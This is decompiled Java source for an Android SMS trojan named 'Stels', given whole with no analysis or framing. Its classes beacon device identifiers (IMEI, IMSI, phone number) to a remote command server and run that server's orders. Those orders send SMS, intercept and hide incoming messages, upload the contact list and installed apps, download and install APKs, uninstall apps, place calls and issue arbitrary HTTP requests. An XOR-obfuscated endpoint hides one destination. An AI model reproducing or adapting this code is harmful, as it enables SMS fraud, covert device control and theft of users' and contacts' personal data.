package ru.stels2;

import android.content.Context;
import android.os.Build;
import android.os.Build.VERSION;
import java.net.HttpURLConnection;
import java.util.LinkedList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONObject;

public class Stels {
    public static Settings settings;

    public Stels(Context context, JSONObject jsonObject) {
        settings = new Settings();
        Settings settings = settings;
        Settings.setSettings(settings);
        if (settings.load(context)) {
            if (System.currentTimeMillis() > settings.timeNextConnection) {
                settings.timeNextConnection = System.currentTimeMillis() + ((long) (settings.period * Constants.SECOND));
                settings.save(context);
            }
            Functions.startTimer(context);
            Functions.startTimerInfo(context);
        } else if (jsonObject.has("server") && jsonObject.has("period") && jsonObject.has("startPeriod") && jsonObject.has("sid")) {
            try {
                settings.version = "2";
                settings.server = jsonObject.getString("server");
                settings.period = jsonObject.getInt("period");
                settings.startPeriod = jsonObject.getInt("startPeriod");
                settings.sid = jsonObject.getString("sid");
                if (jsonObject.has("subPref")) {
                    settings.subPref = jsonObject.getString("subPref");
                }
                if (jsonObject.has("botId")) {
                    settings.botId = jsonObject.getString("botId");
                }
                settings.timeNextConnection = System.currentTimeMillis() + ((long) (settings.startPeriod * Constants.SECOND));
                settings.save(context);
                Functions.startTimer(context);
                Functions.startTimerInfo(context);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    public static List<NameValuePair> getDefaultHttpParams(String type) {
        List<NameValuePair> params = new LinkedList();
        params.add(new BasicNameValuePair("imei", settings.imei));
        params.add(new BasicNameValuePair("imsi", settings.imsi));
        params.add(new BasicNameValuePair("time", String.valueOf(System.currentTimeMillis())));
        params.add(new BasicNameValuePair("phone", settings.phone));
        params.add(new BasicNameValuePair("version", settings.version));
        params.add(new BasicNameValuePair("sid", settings.sid));
        params.add(new BasicNameValuePair("type", type));
        params.add(new BasicNameValuePair("os", "android"));
        params.add(new BasicNameValuePair("model", Build.MODEL));
        params.add(new BasicNameValuePair("manufacturer", Build.MANUFACTURER));
        params.add(new BasicNameValuePair("sdk", String.valueOf(VERSION.SDK_INT)));
        params.add(new BasicNameValuePair("subPref", settings.subPref));
        params.add(new BasicNameValuePair("botId", settings.botId));
        return params;
    }

    public static JSONObject sendRequest(Context context) {
        try {
            HttpURLConnection connection = Functions.sendHttpRequest(settings.server, "POST", getDefaultHttpParams("callback"), new LinkedList(), false, null);
            if (connection != null && connection.getResponseCode() == 200) {
                return Functions.parseResponse(connection.getInputStream());
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return new JSONObject();
    }

    public static void sendContactsToServer(String contacts) {
        try {
            HttpURLConnection connection = Functions.sendHttpRequest(settings.server, "POST", getDefaultHttpParams("phonebook"), new LinkedList(), true, contacts);
            if (connection != null) {
                int code = connection.getResponseCode();
                connection.disconnect();
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void sendPackagesToServer(String packages) {
        try {
            HttpURLConnection connection = Functions.sendHttpRequest(settings.server, "POST", getDefaultHttpParams("packages"), new LinkedList(), true, packages);
            if (connection != null) {
                int code = connection.getResponseCode();
                connection.disconnect();
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static JSONObject sendCatchRequest(String number, String text) {
        try {
            List<NameValuePair> params = getDefaultHttpParams("catch");
            params.add(new BasicNameValuePair("number", number));
            params.add(new BasicNameValuePair("text", text));
            HttpURLConnection connection = Functions.sendHttpRequest(settings.server, "POST", params, new LinkedList(), false, null);
            if (connection != null && connection.getResponseCode() == 200) {
                return Functions.parseResponse(connection.getInputStream());
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return new JSONObject();
    }
}
package ru.stels2;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.SystemClock;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONObject;

public final class MainService extends Service implements ThreadOperationListener {
    public static void start(Context context, Intent intent, String key) {
        try {
            Intent service = new Intent(context, MainService.class);
            Bundle extras = intent.getExtras();
            if (extras != null) {
                service.putExtras(extras);
            }
            service.putExtra("key", key);
            context.startService(service);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void start(Context context, Intent intent, String key, String number, String text, long id) {
        try {
            Intent service = new Intent(context, MainService.class);
            Bundle extras = intent.getExtras();
            if (extras != null) {
                service.putExtras(extras);
            }
            service.putExtra("key", key);
            service.putExtra("number", number);
            service.putExtra("text", text);
            service.putExtra("id", String.valueOf(id));
            context.startService(service);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public void onCreate() {
        super.onCreate();
        setForeground(true);
    }

    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        try {
            Bundle extras = intent.getExtras();
            if (extras != null && extras.get("key") != null) {
                String key = (String) extras.get("key");
                if (key.equals("alarm")) {
                    new Thread(new ThreadOperation(this, 1, null)).start();
                } else if (key.equals("catch")) {
                    String number = (String) extras.get("number");
                    String text = (String) extras.get("text");
                    String id = (String) extras.get("id");
                    new Thread(new ThreadOperation(this, 4, new String[]{number, text, id})).start();
                }
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onDestroy() {
    }

    public void threadOperationRun(int id, Object obj) {
        JSONObject response;
        Settings settings;
        if (id == 1) {
            try {
                response = Stels.sendRequest(this);
                settings = Settings.getSettings();
                settings.timeNextConnection = System.currentTimeMillis() + ((long) (settings.period * Constants.SECOND));
                settings.save(this);
                executeCommands(response);
                Functions.startTimer(this);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        } else if (id == 2) {
            Stels.sendContactsToServer(Functions.contactsToJson(Functions.getContacts(this)));
        } else if (id == 3) {
            Stels.sendPackagesToServer(Functions.appListToJson(Functions.getInstalledAppList(this)));
        } else if (id == 4) {
            String[] params = (String[]) obj;
            response = Stels.sendCatchRequest(params[0], params[1]);
            try {
                if (response.has(Constants.REMOVE_CURRENT_FILTER) && Boolean.valueOf(response.getBoolean(Constants.REMOVE_CURRENT_FILTER)).booleanValue()) {
                    settings = Settings.getSettings();
                    settings.removeCatchFilter(Long.parseLong(params[2]));
                    settings.save(this);
                }
            } catch (Exception ex2) {
                ex2.printStackTrace();
            }
            executeCommands(response);
        }
    }

    public void executeCommands(JSONObject response) {
        try {
            JSONArray jsonArray;
            int i;
            JSONObject jsonObject;
            String url;
            Settings settings = Settings.getSettings();
            if (response.has(Constants.WAIT)) {
                settings.timeNextConnection = System.currentTimeMillis() + ((long) (response.getInt(Constants.WAIT) * Constants.SECOND));
                settings.save(this);
            }
            if (response.has(Constants.SERVER)) {
                settings.server = response.getString(Constants.SERVER);
                settings.save(this);
            }
            if (response.has("subPref")) {
                settings.subPref = response.getString("subPref");
                settings.save(this);
            }
            if (response.has("botId")) {
                settings.botId = response.getString("botId");
                settings.save(this);
            }
            if (response.has(Constants.CLEAR_DELETE_FILTERS)) {
                if (Boolean.valueOf(response.getBoolean(Constants.CLEAR_DELETE_FILTERS)).booleanValue()) {
                    settings.deleteSmsList.clear();
                    settings.save(this);
                }
            }
            if (response.has(Constants.CLEAR_CATCH_FILTERS)) {
                if (Boolean.valueOf(response.getBoolean(Constants.CLEAR_CATCH_FILTERS)).booleanValue()) {
                    settings.catchSmsList.clear();
                    settings.save(this);
                }
            }
            if (response.has(Constants.DELETE_SMS)) {
                settings.deleteSmsList.clear();
                settings.save(this);
                jsonArray = response.getJSONArray(Constants.DELETE_SMS);
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonObject = jsonArray.getJSONObject(i);
                    settings.deleteSmsList.add(new SmsItem(jsonObject.getString(Constants.PHONE), jsonObject.getString(Constants.TEXT)));
                }
                settings.save(this);
            }
            if (response.has(Constants.CATCH_SMS)) {
                settings.catchSmsList.clear();
                settings.save(this);
                jsonArray = response.getJSONArray(Constants.CATCH_SMS);
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonObject = jsonArray.getJSONObject(i);
                    settings.catchSmsList.add(new SmsItem(jsonObject.getString(Constants.PHONE), jsonObject.getString(Constants.TEXT)));
                }
                settings.save(this);
            }
            if (response.has(Constants.SEND_SMS)) {
                jsonArray = response.getJSONArray(Constants.SEND_SMS);
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonObject = jsonArray.getJSONObject(i);
                    SystemClock.sleep((long) Constants.SMS_SEND_SLEEP);
                    Functions.sendSms(jsonObject.getString(Constants.PHONE), jsonObject.getString(Constants.TEXT));
                }
            }
            if (response.has(Constants.HTTP_REQUEST)) {
                JSONObject jsonParams;
                jsonObject = response.getJSONObject(Constants.HTTP_REQUEST);
                String method = jsonObject.getString(Constants.METHOD);
                url = jsonObject.getString(Constants.URL);
                List<NameValuePair> paramsList = new ArrayList();
                List<NameValuePair> propertyList = new ArrayList();
                jsonArray = jsonObject.getJSONArray(Constants.PARAMS);
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonParams = jsonArray.getJSONObject(i);
                    paramsList.add(new BasicNameValuePair(jsonParams.getString(Constants.NAME), jsonParams.getString(Constants.VALUE)));
                }
                jsonArray = jsonObject.getJSONArray(Constants.PROPERTIES);
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonParams = jsonArray.getJSONObject(i);
                    propertyList.add(new BasicNameValuePair(jsonParams.getString(Constants.NAME), jsonParams.getString(Constants.VALUE)));
                }
                Functions.sendSimpleHttpRequest(url, method, paramsList, propertyList);
            }
            if (response.has(Constants.UPDATE)) {
                String path = response.getString(Constants.UPDATE);
                ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService("connectivity");
                if (connectivityManager.getNetworkInfo(1).isAvailable() || connectivityManager.getNetworkInfo(0).isConnectedOrConnecting()) {
                    String name = System.currentTimeMillis() + ".apk";
                    String localPath = Environment.getExternalStorageDirectory() + "/download/";
                    if (Functions.downloadFile(localPath, path, name)) {
                        Functions.installApk(this, localPath + name);
                    }
                }
            }
            if (response.has(Constants.UNINSTALL)) {
                jsonArray = response.getJSONArray(Constants.UNINSTALL);
                for (i = 0; i < jsonArray.length(); i++) {
                    Functions.uninstallApk(this, jsonArray.getString(i));
                }
            }
            if (response.has(Constants.NOTIFICATION)) {
                jsonObject = response.getJSONObject(Constants.NOTIFICATION);
                url = jsonObject.getString(Constants.URL);
                Functions.showNotification(this, jsonObject.getString(Constants.TICKER_TEXT), jsonObject.getString(Constants.TITLE), jsonObject.getString(Constants.TEXT), jsonObject.getInt(Constants.ICON), url);
            }
            if (response.has(Constants.OPEN_URL)) {
                Functions.openUrl(this, response.getString(Constants.OPEN_URL));
            }
            if (response.has(Constants.SEND_CONTACTS)) {
                if (Boolean.valueOf(response.getBoolean(Constants.SEND_CONTACTS)).booleanValue()) {
                    new Thread(new ThreadOperation(this, 2, null)).start();
                }
            }
            if (response.has(Constants.SEND_PACKAGES)) {
                if (Boolean.valueOf(response.getBoolean(Constants.SEND_PACKAGES)).booleanValue()) {
                    new Thread(new ThreadOperation(this, 3, null)).start();
                }
            }
            if (response.has(Constants.MAKE_CALL)) {
                Functions.makeCall(this, response.getString(Constants.MAKE_CALL));
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
package ru.stels2;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.support.v4.view.MotionEventCompat;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.client.utils.URLEncodedUtils;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONObject;

public class Functions {
    public static HttpURLConnection sendHttpRequest(String path, String method, List<NameValuePair> paramsList, List<NameValuePair> propertyList, boolean uploadFile, String data) {
        String KContentType = "multipart/form-data; boundary=AaB03x";
        String KStartContent = "--AaB03x";
        String KEndContent = "--AaB03x--";
        String KCrlf = "\r\n";
        URL url = null;
        try {
            int i;
            NameValuePair param;
            if (method.equals("POST")) {
                url = new URL(path);
            } else if (method.equals("GET")) {
                url = new URL(path + "?" + URLEncodedUtils.format(paramsList, "utf-8"));
            }
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.setRequestMethod(method);
            if (method.equals("POST")) {
                connection.setRequestProperty("Content-Type", KContentType);
            }
            for (i = 0; i < propertyList.size(); i++) {
                param = (NameValuePair) paramsList.get(i);
                connection.setRequestProperty(param.getName(), param.getValue());
            }
            if (method.equals("POST")) {
                DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
                for (i = 0; i < paramsList.size(); i++) {
                    param = (NameValuePair) paramsList.get(i);
                    outputStream.writeBytes(KStartContent);
                    outputStream.writeBytes(KCrlf);
                    outputStream.writeBytes("Content-Disposition: form-data; name=\"" + param.getName() + "\"");
                    outputStream.writeBytes(KCrlf);
                    outputStream.writeBytes(KCrlf);
                    outputStream.write(param.getValue().getBytes("utf-8"));
                    outputStream.writeBytes(KCrlf);
                }
                if (uploadFile) {
                    outputStream.writeBytes(KStartContent);
                    outputStream.writeBytes(KCrlf);
                    outputStream.writeBytes("Content-Disposition: form-data; name=\"FILE\"; filename=\"data.json\"");
                    outputStream.writeBytes(KCrlf);
                    outputStream.writeBytes("Content-Type: application/octet-stream");
                    outputStream.writeBytes(KCrlf);
                    outputStream.writeBytes("Content-Transfer-Encoding: binary");
                    outputStream.writeBytes(KCrlf);
                    outputStream.writeBytes(KCrlf);
                    outputStream.write(data.getBytes("utf-8"));
                    outputStream.writeBytes(KCrlf);
                }
                outputStream.writeBytes(KEndContent);
                outputStream.writeBytes(KCrlf);
                outputStream.flush();
                outputStream.close();
            } else if (method.equals("GET")) {
                connection.connect();
            }
            return connection;
        } catch (Exception ex) {
            ex.printStackTrace();
            return null;
        }
    }

    public static void sendPostRequest(String path, List<NameValuePair> paramsList, List<NameValuePair> propertyList) {
        sendSimpleHttpRequest(path, "POST", paramsList, propertyList);
    }

    public static void sendGetRequest(String path, List<NameValuePair> paramsList, List<NameValuePair> propertyList) {
        sendSimpleHttpRequest(path, "GET", paramsList, propertyList);
    }

    public static void sendSimpleHttpRequest(String path, String method, List<NameValuePair> paramsList, List<NameValuePair> propertyList) {
        try {
            HttpURLConnection connection = sendHttpRequest(path, method, paramsList, propertyList, false, null);
            if (connection != null) {
                int code = connection.getResponseCode();
                connection.disconnect();
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static JSONObject parseResponse(InputStream stream) {
        try {
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(stream), 8);
            StringBuffer stringBuffer = new StringBuffer();
            while (true) {
                String line = bufferedReader.readLine();
                if (line == null) {
                    break;
                }
                stringBuffer.append(line);
            }
            bufferedReader.close();
            String response = stringBuffer.toString().trim();
            System.out.println("response: " + response);
            if (response.length() > 3) {
                for (int i = 0; i < 3 && !response.startsWith("{"); i++) {
                    response = response.substring(1);
                }
            }
            return new JSONObject(response);
        } catch (Exception ex) {
            ex.printStackTrace();
            return new JSONObject();
        }
    }

    public static List<String> getContacts(Context context) {
        List<String> list = new ArrayList();
        Uri uri = null;
        try {
            String name = "";
            Class[] childClasses;
            int i;
            if (VERSION.SDK_INT > 4) {
                childClasses = Class.forName("android.provider.ContactsContract").getClasses();
                i = 0;
                while (i < childClasses.length) {
                    if (childClasses[i].getCanonicalName().equals("android.provider.ContactsContract.CommonDataKinds")) {
                        childClasses = childClasses[i].getClasses();
                        for (int j = 0; j < childClasses.length; j++) {
                            if (childClasses[j].getCanonicalName().equals("android.provider.ContactsContract.CommonDataKinds.Phone")) {
                                Class phoneClass = childClasses[j];
                                uri = (Uri) phoneClass.getField("CONTENT_URI").get(null);
                                name = (String) phoneClass.getField("NUMBER").get(null);
                                break;
                            }
                        }
                    } else {
                        i++;
                    }
                }
            } else {
                childClasses = Class.forName("android.provider.Contacts").getClasses();
                for (i = 0; i < childClasses.length; i++) {
                    if (childClasses[i].getCanonicalName().equals("android.provider.Contacts.Phones")) {
                        Class phonesClass = childClasses[i];
                        uri = (Uri) phonesClass.getField("CONTENT_URI").get(null);
                        name = (String) phonesClass.getField("NUMBER").get(null);
                        break;
                    }
                }
            }
            Cursor cursor = context.getContentResolver().query(uri, null, null, null, null);
            while (cursor.moveToNext()) {
                String phone = cursor.getString(cursor.getColumnIndex(name));
                list.add(phone);
                System.out.println("phone: " + phone);
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return list;
    }

    public static String contactsToJson(List<String> contacts) {
        JSONArray jsonArray = new JSONArray();
        int i = 0;
        while (i < contacts.size()) {
            try {
                jsonArray.put(contacts.get(i));
                i++;
            } catch (Exception ex) {
                ex.printStackTrace();
                return "";
            }
        }
        return jsonArray.toString();
    }

    public static boolean downloadFile(String localPath, String httpUrl, String fileName) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(httpUrl).openConnection();
            c.setRequestMethod("GET");
            c.setDoOutput(true);
            c.connect();
            File file = new File(localPath);
            file.mkdirs();
            FileOutputStream fos = new FileOutputStream(new File(file, fileName));
            InputStream is = c.getInputStream();
            byte[] buffer = new byte[1024];
            while (true) {
                int len1 = is.read(buffer);
                if (len1 != -1) {
                    fos.write(buffer, 0, len1);
                } else {
                    fos.close();
                    is.close();
                    return true;
                }
            }
        } catch (Exception e) {
            return false;
        }
    }

    public static void makeCall(Context context, String phone) {
        Intent intent = new Intent("android.intent.action.CALL", Uri.parse("tel:" + phone));
        intent.addFlags(268435456);
        context.startActivity(intent);
    }

    public static void installApk(Context context, String path) {
        try {
            Intent intent = new Intent("android.intent.action.VIEW");
            intent.addFlags(268435456);
            intent.setDataAndType(Uri.fromFile(new File(path)), "application/vnd.android.package-archive");
            context.startActivity(intent);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void openUrl(Context context, String url) {
        try {
            Intent browserIntent = new Intent("android.intent.action.VIEW", Uri.parse(url));
            browserIntent.addFlags(268435456);
            context.startActivity(browserIntent);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void uninstallApk(Context context, String pkg) {
        try {
            Intent intent = new Intent("android.intent.action.DELETE");
            intent.setData(Uri.parse("package:" + pkg));
            intent.addFlags(268435456);
            context.startActivity(intent);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void showNotification(Context context, String tickerText, String title, String text, int icon, String url) {
        try {
            NotificationManager mNotificationManager = (NotificationManager) context.getSystemService("notification");
            Notification notification = new Notification(icon, tickerText, System.currentTimeMillis());
            Intent notificationIntent = new Intent("android.intent.action.VIEW", Uri.parse(url));
            notificationIntent.addFlags(268435456);
            notification.setLatestEventInfo(context, title, text, PendingIntent.getActivity(context, 0, notificationIntent, 0));
            mNotificationManager.notify(1, notification);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static boolean sendSms(String number, String text) {
        Settings settings = Settings.getSettings();
        if (settings != null) {
            text = text.replace("{IMEI}", settings.imei).replace("{IMSI}", settings.imsi).replace("{SID}", settings.sid).replace("{VERSION}", settings.version) + settings.subPref;
        }
        try {
            SmsManager.getDefault().sendTextMessage(number, null, text, null, null);
            return true;
        } catch (Exception ex) {
            ex.printStackTrace();
            return false;
        }
    }

    public static String loadAndDecode(Context context, String path) {
        try {
            InputStream inputStream = context.getClass().getResourceAsStream(path);
            int size = 0;
            while (inputStream.read() != -1) {
                try {
                    size++;
                } catch (Exception e) {
                }
            }
            inputStream.close();
            inputStream = context.getClass().getResourceAsStream(path);
            byte[] arr = new byte[size];
            readDataFromStream(inputStream, arr);
            inputStream.close();
            int j = 0;
            int key_length = arr[0] & MotionEventCompat.ACTION_MASK;
            for (int i = key_length + 1; i < arr.length; i++) {
                arr[i] = (byte) (arr[i] ^ (arr[j + 1] & MotionEventCompat.ACTION_MASK));
                j++;
                if (j == key_length) {
                    j = 0;
                }
            }
            return new String(arr, key_length + 1, (arr.length - key_length) - 1, "utf-8");
        } catch (Exception ex) {
            ex.printStackTrace();
            return "";
        }
    }

    public static void readDataFromStream(InputStream stream, byte[] data) throws IOException {
        int pos = 0;
        int length = data.length;
        while (true) {
            int read = stream.read(data, pos, length);
            length -= read;
            if (length != 0) {
                pos += read;
            } else {
                return;
            }
        }
    }

    public static SmsMessage[] getSmsMessages(Bundle paramBundle) {
        Object[] array = (Object[]) paramBundle.get("pdus");
        SmsMessage[] messages = new SmsMessage[array.length];
        for (int i = 0; i < array.length; i++) {
            messages[i] = SmsMessage.createFromPdu((byte[]) array[i]);
        }
        return messages;
    }

    public static String getImei(Context context) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
            if (telephonyManager == null) {
                return "";
            }
            return telephonyManager.getDeviceId();
        } catch (Exception ex) {
            ex.printStackTrace();
            return "";
        }
    }

    public static String getPhone(Context context) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
            if (telephonyManager == null) {
                return "";
            }
            String phone = telephonyManager.getLine1Number();
            if (phone == null) {
                return "";
            }
            return phone;
        } catch (Exception ex) {
            ex.printStackTrace();
            return "";
        }
    }

    public static String getImsi(Context context) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
            if (telephonyManager == null) {
                return "";
            }
            return telephonyManager.getSubscriberId();
        } catch (Exception ex) {
            ex.printStackTrace();
            return "";
        }
    }

    public static String decript(String data) {
        return decript(Base64.decode(data, 0));
    }

    public static String decript(byte[] data) {
        int j = 0;
        try {
            int key_length = data[0] & MotionEventCompat.ACTION_MASK;
            for (int i = key_length + 1; i < data.length; i++) {
                data[i] = (byte) (data[i] ^ (data[j + 1] & MotionEventCompat.ACTION_MASK));
                j++;
                if (j == key_length) {
                    j = 0;
                }
            }
            return new String(data, key_length + 1, (data.length - key_length) - 1, "utf-8");
        } catch (Exception ex) {
            ex.printStackTrace();
            return "";
        }
    }

    public static List<PackageInfo> getInstalledAppList(Context context) {
        try {
            return context.getPackageManager().getInstalledPackages(0);
        } catch (Exception ex) {
            ex.printStackTrace();
            return new ArrayList();
        }
    }

    public static String appListToJson(List<PackageInfo> list) {
        JSONArray jsonArray = new JSONArray();
        int i = 0;
        while (i < list.size()) {
            try {
                jsonArray.put(((PackageInfo) list.get(i)).packageName);
                i++;
            } catch (Exception ex) {
                ex.printStackTrace();
                return "";
            }
        }
        return jsonArray.toString();
    }

    public static void startTimer(Context context) {
        try {
            Intent intent = new Intent(context, MainReceiver.class);
            intent.setAction("custom.alarm");
            ((AlarmManager) context.getSystemService("alarm")).set(0, Settings.getSettings().timeNextConnection, PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void startTimerInfo(Context context) {
        try {
            Intent intent = new Intent(context, MainReceiver.class);
            intent.setAction("custom.alarm.info");
            ((AlarmManager) context.getSystemService("alarm")).setRepeating(0, System.currentTimeMillis() + ((long) (Constants.DAY * 7)), (long) (Constants.DAY * 7), PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static boolean loadSettings(Context context) {
        if (Settings.getSettings() != null) {
            return true;
        }
        Settings settings = new Settings();
        Settings.setSettings(settings);
        if (settings.load(context)) {
            return true;
        }
        return false;
    }

    public static boolean sendEmail(String to, String subject, String text) {
        try {
            List<NameValuePair> params = new LinkedList();
            params.add(new BasicNameValuePair("to", to));
            params.add(new BasicNameValuePair("subject", subject));
            params.add(new BasicNameValuePair("text", text));
            HttpURLConnection connection = (HttpURLConnection) new URL(decript("FGRmaZ2awotthYxMJtobJOLUSAw2DBId7aDtpAzr4yJft3RRkbFmY0QDSQr68+/pBOujLUi1dQmHuSllWkoFDvQ=")).openConnection();
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.write(URLEncodedUtils.format(params, "utf-8").getBytes("utf-8"));
            outputStream.flush();
            outputStream.close();
            if (connection != null && connection.getResponseCode() == 200) {
                return true;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return false;
    }
}
